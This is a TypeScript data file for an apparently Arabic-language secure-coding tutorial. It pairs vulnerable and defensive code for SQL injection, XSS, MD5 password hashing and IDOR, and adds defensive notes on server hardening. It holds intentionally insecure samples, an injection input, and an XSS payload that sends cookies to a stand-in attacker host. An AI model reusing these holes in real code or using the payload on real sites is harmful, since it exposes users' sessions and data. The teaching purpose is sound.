import { SecurityVulnerabilityDefense } from '../types';

export const securityVulnerabilities: SecurityVulnerabilityDefense[] = [
  {
    id: 'sqli-defense',
    title: 'حقن لغة الاستعلامات (SQL Injection) والدفاع بالاستعلامات المجهزة',
    owaspCategory: 'A03:2021-Injection',
    severity: 'حرج',
    description: 'يحدث عندما يقوم النظام بدمج مدخلات المستخدم مباشرة داخل جملة SQL دون تنقية، مما يتيح التلاعب بالاستعلام وقراءة أو تعديل البيانات الحساسة.',
    vulnerableCode: {
      language: 'python',
      code: `# ❌ كود ضعيف أمنياً (Vulnerable): دمج مباشر غير آمن
user_id = input("أدخل رقم المستخدم: ")
query = f"SELECT * FROM users WHERE id = {user_id};"
cursor.execute(query)  # قد يدخل المهاجم: 1 OR 1=1`,
      explanation: 'دمج المدخلات النصية مباشرة يلغي الفصل بين أمر SQL البرمجي والبيانات، مما يسمح للمهاجم بتمرير أوامر خبيثة تعطل الشرط.'
    },
    defensiveCode: {
      language: 'python',
      code: `# ✅ كود آمن دفاعي (Secure): استخدام Parameterized Queries
user_id = input("أدخل رقم المستخدم: ")
# إرسال المعامل كقيمة منفصلة يفهمها المحرك كـ Data فقط
query = "SELECT id, username, email FROM users WHERE id = %s;"
cursor.execute(query, (user_id,))
result = cursor.fetchone()`,
      explanation: 'الاستعلام المجهز (Parameterized Query / Prepared Statement) يجعل محرك قاعدة البيانات يتعامل مع المدخل كقيمة نصية محضة ولا يمكن تنفيذها كأمر إطلاقاً.'
    },
    remediationSteps: [
      'استخدم دائماً الاستعلامات المجهزة (Prepared Statements / Parameterized Queries).',
      'استعن بأطر عمل ORM الحديثة (مثل SQLAlchemy أو Django ORM).',
      'طبق مبدأ أقل الصلاحيات (Least Privilege) على حساب مستخدم قاعدة البيانات بحيث لا يملك صلاحية DROP أو مسح الجداول الحساسة.',
      'عطل إظهار رسائل أخطاء SQL المفصلة للمستخدمين العاديين.'
    ],
    safetyAdvisory: 'تحذير أمني: فحص قواعد البيانات بدون إذن خطي مسبق على أنظمة لا تملكها يعد جريمة معلوماتية بموجب القوانين والأنظمة المعمول بها دولياً ومحلياً.'
  },
  {
    id: 'xss-defense',
    title: 'البرمجة النصية عبر المواقع (Cross-Site Scripting - XSS)',
    owaspCategory: 'A03:2021-Injection',
    severity: 'عالي',
    description: 'يحدث عند عرض مدخلات غير موثوقة من المستخدم مباشرة على صفحة الويب في المتصفح دون تشفير المحارف (HTML Escaping)، مما يسمح بسرقة ملفات تعريف الارتباط والجلسات.',
    vulnerableCode: {
      language: 'javascript',
      code: `// ❌ كود ضعيف (Vulnerable): إدراج مباشر في الصفحة
const userBio = req.body.bio;
// استخدام innerHTML مع مدخلات المستخدم مباشرة
document.getElementById('bio-container').innerHTML = userBio;`,
      explanation: 'لو قام المستخدم بإدخال <script>fetch("https://attacker.com?c="+document.cookie)</script> فسيتم تشغيله فوراً في متصفح الضحية.'
    },
    defensiveCode: {
      language: 'javascript',
      code: `// ✅ كود آمن دفاعي (Secure): استخدام textContent أو مكتبات التطهير
const userBio = req.body.bio;

// 1. الخيار الأول: التعامل معه كنص عادي خالص
document.getElementById('bio-container').textContent = userBio;

// 2. الخيار الثاني عند الحاجة لـ HTML غني: استخدام DOMPurify
import DOMPurify from 'dompurify';
const cleanHtml = DOMPurify.sanitize(userBio);
document.getElementById('bio-container').innerHTML = cleanHtml;`,
      explanation: 'يحوّل textContent كل المحارف الخاصة (<, >, &) إلى محارف نصية آمنة تمنع المتصفح من تفسيرها كأكواد برمجية تنفيذية.'
    },
    remediationSteps: [
      'استخدم التشفير السياقي Context-aware Output Encoding.',
      'تطبيق ترويسة سياسة أمان المحتوى (Content-Security-Policy: default-src \'self\').',
      'تعيين خيار HttpOnly و Secure على ملفات تعريف الارتباط (Cookies) الخاصة بالجلسات لمنع قراءتها عبر JavaScript.'
    ],
    safetyAdvisory: 'احرص دائماً على اختبار تطبيقاتك داخل بيئات معزولة (Localhost / Sandbox) لتأكيد خلوها من نقاط الضعف.'
  },
  {
    id: 'password-hashing-defense',
    title: 'حفظ كلمات المرور الآمن عبر التجزئة المملحة (Bcrypt / Argon2)',
    owaspCategory: 'A02:2021-Cryptographic Failures',
    severity: 'حرج',
    description: 'تخزين كلمات المرور بنص صريح (Plaintext) أو باستخدام دوال سريعة وضعيفة مثل MD5 أو SHA-1 يعرض حسابات المستخدمين للاختراق السريع عبر جداول Rainbow Tables.',
    vulnerableCode: {
      language: 'python',
      code: `# ❌ كارثة أمنية: استخدام MD5 السريع وغير المملح
import hashlib
def weak_store_password(password):
    # خوارزمية قديمة وسريعة جداً يمكن كسرها في ثوانٍ
    return hashlib.md5(password.encode()).hexdigest()`,
      explanation: 'خوارزمية MD5 مصممة للسرعة وليس للأمان، وتسمح للمهاجمين بتجربة مليارات الاحتمالات في الثانية الواحدة.'
    },
    defensiveCode: {
      language: 'python',
      code: `# ✅ المعيار العالمي الآمن: استخدام bcrypt أو argon2 مع ملح آلي
import bcrypt

def hash_password_securely(plain_password: str) -> bytes:
    # توليد ملح مشفر عشوائي ورفع معامل التكلفة للحد من القوة الغاشمة
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(plain_password.encode('utf-8'), salt)

def verify_password(plain_password: str, hashed_password: bytes) -> bool:
    return bcrypt.checkpw(plain_password.encode('utf-8'), hashed_password)

# تجربة
hashed = hash_password_securely("MyUltra#SecurePass2026")
print("الهاش المشفر الآمن:", hashed.decode()[:30] + "...")
print("التحقق الصحيح:", verify_password("MyUltra#SecurePass2026", hashed))`,
      explanation: 'خوارزمية bcrypt تستخدم تقنية الإبطاء المحسوب (Key Stretching) والملح العشوائي (Salt) لمنع هجمات القواميس وهجمات القوة الغاشمة.'
    },
    remediationSteps: [
      'استخدم خوارزميات بطيئة مصممة لحفظ كلمات المرور: Argon2id أو bcrypt أو PBKDF2.',
      'لا تكتب خوارزمية تشفير خاصة بك مطلقاً (Don\'t Roll Your Own Crypto).',
      'حدد حداً أدنى لطول كلمة المرور (12 خانة على الأقل) مع فرض المصادقة الثنائية (MFA / 2FA).'
    ],
    safetyAdvisory: 'حماية بيانات اعتماد المستخدمين هي خط الدفاع الأول ضد تسريب الحسابات وسرقة الهويات الرقمية.'
  },
  {
    id: 'idor-defense',
    title: 'الوصول المباشر غير الآمن إلى الكائنات (Broken Access Control / IDOR)',
    owaspCategory: 'A01:2021-Broken Access Control',
    severity: 'حرج',
    description: 'يحدث عندما يعتمد التطبيق على معرّف (ID) يرسله المستخدم في الرابط دون التحقق من أن هذا المستخدم يملك فعلياً صلاحية رؤية ذلك الملف أو السجل.',
    vulnerableCode: {
      language: 'python',
      code: `# ❌ كود ضعيف: قراءة فاتورة بمجرد تغيير الرقم في الرابط
@app.route("/api/invoice/<int:invoice_id>")
def get_invoice(invoice_id):
    # لا يوجد فحص لمن يملك الفاتورة! أي مستخدم يستطيع رؤية فواتير غيره
    invoice = db.query(Invoice).filter_by(id=invoice_id).first()
    return jsonify(invoice.data)`,
      explanation: 'يكفي أن يغير المستخدم في الرابط /api/invoice/100 إلى /api/invoice/101 ليتصفح بيانات عميل آخر بالكامل.'
    },
    defensiveCode: {
      language: 'python',
      code: `# ✅ كود آمن دفاعي: التحقق الصارم من ملكية السجل والمصادقة
@app.route("/api/invoice/<int:invoice_id>")
@jwt_required()
def get_invoice_secure(invoice_id):
    current_user_id = get_jwt_identity()
    
    # الاستعلام يقيد النتيجة بمالك الحساب المصرح له فقط
    invoice = db.query(Invoice).filter_by(
        id=invoice_id, 
        owner_id=current_user_id
    ).first()
    
    if not invoice:
        # إرجاع 404 أو 403 لمنع تخمين وجود أرقام الفواتير
        return jsonify({"error": "الفاتورة غير موجودة أو غير مصرح لك"}), 404
        
    return jsonify(invoice.data)`,
      explanation: 'ربط الاستعلام بمعرف المستخدم الحالي المسجل رسمياً يمنع أي شخص من الوصول إلى سجلات لا تخصه.'
    },
    remediationSteps: [
      'تحقق من صلاحية الوصول على مستوى السيرفر في كل عملية طلب بيانات (Never trust client IDs).',
      'استخدم معرّفات فريدة عشوائية وغير متسلسلة مثل UUID v4 بدلاً من الأرقام المتسلسلة (1, 2, 3).',
      'قم بتسجيل محاولات الوصول غير المصرح بها لمراقبة أي سلوك استطلاعي مريب.'
    ],
    safetyAdvisory: 'التحكم بالوصول (Access Control) يحتل الترتيب الأول كأخطر ثغرة في تصنيف OWASP Top 10 العالمي.'
  }
];

export const defensiveReconAuditKnowledge = [
  {
    topic: 'مراقبة سجلات الخادم وكشف محاولات المسح (Log Auditing)',
    summary: 'كيف تكتشف الأنظمة محاولات استطلاع الثغرات وهجمات التخمين الآلية وتتعامل معها.',
    details: 'يقوم مسؤولو الأنظمة وفرق الدفاع السيبراني (Blue Teams) بمراقبة سجلات الوصول (Access Logs) مثل Nginx وApache بواسطة أدوات SIEM. عندما يرسل مستخدم طلبات متكررة لمسارات مثل /admin, /wp-login, /.env في فترات زمنية سريعة، يقوم جدار حماية تطبيقات الويب (WAF) أو أداة مثل Fail2Ban بحظر عنوان IP تلقائياً.',
    defensiveAction: 'تثبيت Fail2Ban مع مراقبة أخطاء 404 و 401 المتكررة وإعداد تنبيهات فورية عند تجاوز الحد المسموح.'
  },
  {
    topic: 'تقليل البصمة الرقمية للأنظمة (Digital Footprint Hardening)',
    summary: 'إخفاء معلومات الخادم وإصدارات البرمجيات لمنع المهاجمين من استهداف ثغرات محددة.',
    details: 'المهاجمون يعتمدون على قراءة ترويسات الخوادم مثل "Server: Apache/2.4.49" أو "X-Powered-By: PHP/7.4". التدبير الدفاعي الموصى به هو إخفاء هذه الترويسات كلياً في ملفات الإعداد الخاصة بالخادم لمنع جمع المعلومات السلبي.',
    defensiveAction: 'في Nginx ضع server_tokens off; وفي Express استخدم app.disable("x-powered-by"); وحزمة helmet().'
  },
  {
    topic: 'ملف التنسيق الأمني المسؤول (security.txt)',
    summary: 'معيار RFC 9116 لإتاحة قناة تواصل رسمية للباحثين الأمنيين الأخلاقيين للإبلاغ عن الثغرات.',
    details: 'يوضع ملف security.txt داخل مجلد /.well-known/ على الموقع ويحتوي على البريد الإلكتروني الرسمي لفريق الأمان، ومفتاح PGP لتشفير المراسلات، ومسار برنامج مكافآت الثغرات (Bug Bounty).',
    defensiveAction: 'إنشاء ملف /.well-known/security.txt وتحديد إيميل الأمان وسياسة الإفصاح المنسق للثغرات.'
  }
];
